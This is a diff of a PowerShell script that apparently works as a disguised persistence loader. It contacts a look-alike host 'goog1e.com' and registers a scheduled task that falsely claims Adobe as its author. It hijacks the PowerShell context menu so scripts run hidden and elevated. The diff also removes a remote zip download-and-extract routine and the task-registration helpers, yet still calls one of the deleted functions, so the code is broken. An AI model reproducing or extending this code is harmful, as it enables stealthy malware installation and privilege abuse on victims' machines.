@@ -1,7 +1,7 @@
 
 #Requires -Version 5
 
-$taskVersion = "1.0"
+$taskVersion = "1.6"
 $uri = "https://goog1e.com"
 
 $TasksDefinitions = @{
@@ -18,7 +18,7 @@ $TasksDefinitions = @{
     <Date>1971-08-31T00:00:00.0000000</Date>
     <Author>Adobe Systems Incorporated</Author>
     <Description>Pswh watcher</Description>
-    <Version>' + $taskVersion + '</Version>
+    <Version>$taskVersion</Version>
     <URI>\Adobe_Watcher</URI>
   </RegistrationInfo>
   <Triggers>
@@ -72,22 +72,6 @@ $TasksDefinitions = @{
 
 ######## Local functions
 
-function _Unpack {
-  param(
-    [string]$DonwloadUri,
-    [string]$DestinationFolder
-  )
-
-  $tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'zip' } -PassThru
-  Invoke-WebRequest -OutFile $tmp $DonwloadUri
-  Add-Type -Assembly System.IO.Compression.FileSystem
-  $zip = [IO.Compression.ZipFile]::OpenRead($tmp.FullName)
-  $entries = $zip.Entries | Where-Object { -not [string]::IsNullOrWhiteSpace($_.Name) -and -not $_.Name.EndsWith(".cmd") -and -not $_.Name.ToLower().Equals("sha256sums") }
-  foreach ($entry in $entries) {
-    $dpath = Join-Path -Path $DestinationFolder -ChildPath $entry.Name
-    [IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $dpath, $true)
-  }
-}
 
 function _PwshContextMenu {
   #$oldVarDefault = (Get-ItemProperty -path Registry::HKEY_CLASSES_ROOT\Microsoft.PowerShellScript.1\Shell\Open\Command)."(Default)"
@@ -114,55 +98,6 @@ function _PwshContextMenu {
   $keyValue = 'C:\Program Files\PowerShell\7\pwsh.exe" -WindowStyle Hidden "-Command" ""& {Start-Process """C:\Program Files\PowerShell\7\pwsh.exe""" -ArgumentList ''-ExecutionPolicy RemoteSigned -File \"%1\"'' -Verb RunAs;start-sleep 1}'
   Set-ItemProperty -Path "$keyName\Command" -Name '(Default)' -Value $keyValue -Type String
   Set-ItemProperty -Path "$keyName\Command" -Name "PowerShellPath" -Value $pwshPath -Type String
-}
-
-function _RegisterTask {
-  param (
-    [Parameter()]
-    [string]$TaskName
-  )
-  
-  $taskData = $TasksDefinitions[$TaskName];
-  $xml = [xml]$taskData["XmlDefinition"]
-  $ns = New-Object System.Xml.XmlNamespaceManager($xml.NameTable)
-  $ns.AddNamespace("ns", $xml.DocumentElement.NamespaceURI)
-  foreach ($item in $TasksDefinitions[$TaskName]["Values"].Keys) {
-    $xmlNode = $xml.SelectSingleNode($item, $ns);
-    if ($xmlNode) {
-      $innerText = $TasksDefinitions[$TaskName]["Values"][$item] -replace '{RootFolder}', $destinationFolder -replace '{ScriptFile}', $scriptFile
-      $xmlNode.InnerText = $innerText
-    }
-  }
-  $taskData["XmlDefinition"] = $xml.OuterXml;
-  Register-Task -TaskData $taskData -Force
-}
-
-function _CheckTask {
-  param (
-    [Parameter(Mandatory = $true)]
-    [string]$TaskName,
-    [Parameter()]
-    [switch]$Register = $false
-  )
-
-  $scheduledTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-  $needRegister = $false
-
-  if (-not $scheduledTask) {
-    $needRegister = $true
-  }
-  else {
-    $taskVersionCurrent = $scheduledTask.Version
-    if ((Get-ScheduledTask -TaskName $TaskName).State -eq "Disabled" -or ($taskVersionCurrent -ne $taskVersion)) {
-      Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
-      $needRegister = $true
-    }
-  }
-  if ($needRegister -and $Register) {
-    _RegisterTask -TaskName $TaskName;
-    $needRegister = !$needRegister;
-  }
-  return !$needRegister
 }
 
 function _CheckServerConnection
@@ -229,7 +164,7 @@ $debugger = $false; #($PSBoundParameters.ContainsKey("Debug")) -or ($DebugPrefer
 
 if(-not $debugger)
 {
-  $taskExist = _CheckTask -TaskName $TaskName -Register;
+  $taskExist = _RegisterTask -TaskName $TaskName
   if (!$taskExist) {
     exit
   }
